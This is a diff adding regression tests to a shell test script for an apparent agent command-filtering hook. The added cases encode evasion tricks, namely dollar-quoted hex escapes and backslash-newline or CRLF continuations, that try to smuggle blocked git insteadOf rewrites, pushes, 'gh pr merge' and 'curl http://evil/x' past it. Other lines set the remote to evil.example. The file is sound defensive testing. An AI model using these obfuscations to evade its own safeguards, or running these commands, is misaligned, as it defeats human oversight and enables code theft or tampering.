@@ -119,6 +119,18 @@ check "round 10 codex-1 NUL via \\c@ ends the segment" block '{"tool_name":"Bash
 check "round 10 codex-2 decoy + two adjacent split segments" block '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'$'"'"'\\x74'"'"' config url.x.insteadOf y","cwd":"'"$SWR"'"}}'
 check "round 10 plain backslash-t inside the key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.ins\\teadOf y","cwd":"'"$SWR"'"}}'
 check "round 10 plain backslash-r inside url" block '{"tool_name":"Bash","tool_input":{"command":"git config remote.origin.u\\rl https://evil","cwd":"'"$SWR"'"}}'
+# HIMMEL-4032: a plain escape OUTSIDE a dollar-quote is a bare char to bash (not a TAB), and
+# bash deletes a backslash-newline before parsing, so neither may split the key or the verb.
+check "HIMMEL-4032 dollar-quote + plain escape key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 backslash-newline split insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.inste\\\nadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 continuation before push" block '{"tool_name":"Bash","tool_input":{"command":"git \\\npush origin main","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 CRLF continuation before push" block '{"tool_name":"Bash","tool_input":{"command":"git \\\r\npush origin main","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 continuation split curl" block '{"tool_name":"Bash","tool_input":{"command":"cu\\\nrl http://evil/x","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 continuation split gh" block '{"tool_name":"Bash","tool_input":{"command":"g\\\nh pr merge 1","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 unjoined gh after a continuation stays denied" block '{"tool_name":"Bash","tool_input":{"command":"foo \\\ngh pr merge 1","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 dollar-quote + plain key, user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.$'"'"'\\x6e'"'"'ame x","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 continuation inside user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.na\\\nme x","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 harmless echo continuation allowed" allow '{"tool_name":"Bash","tool_input":{"command":"echo a \\\nb","cwd":"'"$SWR"'"}}'
 # round 11: a 50 KB pad must not make grep hit E2BIG and skip the set-url deny (fail-open vs main)
 PAD=$(head -c 50000 /dev/zero | tr "\0" a)
 check "round 11 padded set-url still denied (E2BIG)" block '{"tool_name":"Bash","tool_input":{"command":"git remote set-url origin https://evil.example/x.git ; echo '"$PAD"'","cwd":"'"$SWR"'"}}'
